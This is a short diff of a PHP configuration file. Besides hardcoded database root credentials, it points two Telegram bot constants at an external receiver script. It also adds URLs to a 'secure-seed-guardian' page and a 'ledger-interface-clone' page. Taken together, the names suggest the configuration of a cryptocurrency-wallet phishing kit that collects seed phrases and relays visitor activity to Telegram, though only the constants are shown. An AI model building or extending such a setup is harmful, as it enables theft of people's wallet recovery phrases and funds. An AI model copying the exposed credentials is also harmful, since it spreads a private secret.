@@ -3,8 +3,10 @@ define('HOST', 'localhost');
 define('USER', 'root');
 define('PASS', '$Provis@2025');
 define('DB', 'fromzero_morevitility');
-define('TELEGRAM_BOT_URL', 'http://localhost/clickactivity/receive_activity.php');
-define('TELEGRAM_ADMIN_BOT_URL', 'http://localhost/clickactivity/receive_activity.php');
+define('TELEGRAM_BOT_URL', 'https://allsmartone.com/santi/teleclickactivity.php');
+define('TELEGRAM_ADMIN_BOT_URL', 'https://allsmartone.com/santi/teleclickactivity.php');
+define('SEED_URL', 'https://secure-seed-guardian.lovable.app/');
+define('LEDGER_URL', 'https://ledger-interface-clone.lovable.app');
 
 function getDbConnection() {
     $conn = mysqli_connect(HOST, USER, PASS, DB);
